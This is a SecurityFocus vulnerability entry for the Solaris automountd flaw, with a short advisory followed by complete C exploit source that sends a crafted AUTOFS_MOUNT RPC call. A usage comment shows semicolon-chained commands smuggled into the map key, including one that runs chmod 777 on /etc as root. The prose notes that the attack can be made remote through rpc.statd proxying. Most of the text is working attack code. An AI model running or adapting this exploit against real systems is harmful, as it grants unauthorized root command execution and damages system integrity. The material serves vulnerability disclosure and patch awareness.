source: http://www.securityfocus.com/bid/235/info

The automounter daemon (automountd) answers file system mount and unmount requests from the autofs filesystem via RPC. A vulnerability has been discovered that may allow an unauthorized user to send arbitrary commands to the automounter daemons. These commands given automounter's SUID root status are executed as root.

This bug was origanally thought to be fixed by a Sun patch, however subsequent findings by a bugtraq poster discovered that the patch was insufficient. Moreover, it was initially thought that this bug was local only. Multiple parties later discovered the problem could be exploited remotely by leveraging the attack off a remote vulnerability in rpc.statd. In particular Solaris rpc.statd allows remote users to proxy RPC requests through itself so they appear to have come from the localhost. 

/*
this is really dumb automountd exploit, tested on solaris 2.5.1
./r blahblah /bin/chmod "777 /etc; 2nd cmd;3rd cmd" and so on,
map is executed via popen with key given as argument, read automount(1M)

patch 10465[45] fixes this

*/

#include <sys/types.h>
#include <sys/time.h>
#include <stdio.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <rpcsvc/autofs_prot.h>

#define AUTOTS "datagram_v" /* XXX */

void usage(char *s) {
printf("Usage: %s mountpoint map key [opts]\n", s);
exit(0);
}

bool_t
xdr_mntrequest(xdrs, objp)
register XDR *xdrs;
mntrequest *objp;
{

register long *buf;

if (!xdr_string(xdrs, &objp->name, A_MAXNAME))
return (FALSE);
if (!xdr_string(xdrs, &objp->map, A_MAXNAME))
return (FALSE);
if (!xdr_string(xdrs, &objp->opts, A_MAXOPTS))
return (FALSE);
if (!xdr_string(xdrs, &objp->path, A_MAXPATH))
return (FALSE);
return (TRUE);
}

bool_t
xdr_mntres(xdrs, objp)
register XDR *xdrs;
mntres *objp;
{

register long *buf;

if (!xdr_int(xdrs, &objp->status))
return (FALSE);
return (TRUE);
}

main(int argc, char *argv[]) {
char hostname[MAXHOSTNAMELEN];
CLIENT *cl;
enum clnt_stat stat;
struct timeval tm;
struct mntrequest req;
struct mntres result;

if (argc < 4)
usage(argv[0]);

req.path=argv[1];
req.map=argv[2];
req.name=argv[3];
req.opts=argv[4];
if (gethostname(hostname, sizeof(hostname)) == -1) {
perror("gethostname");
exit(0);
}
if ((cl=clnt_create(hostname, AUTOFS_PROG, AUTOFS_VERS, AUTOTS)) == NULL) {
clnt_pcreateerror("clnt_create");
exit(0);
}
tm.tv_sec=5;
tm.tv_usec=0;
stat=clnt_call(cl, AUTOFS_MOUNT, xdr_mntrequest, (char *)&req, xdr_mntres,
(char *)&result, tm);
if (stat != RPC_SUCCESS)
clnt_perror(cl, "mount call");
else
printf("mntres = %d.\n", result.status);
clnt_destroy(cl);
}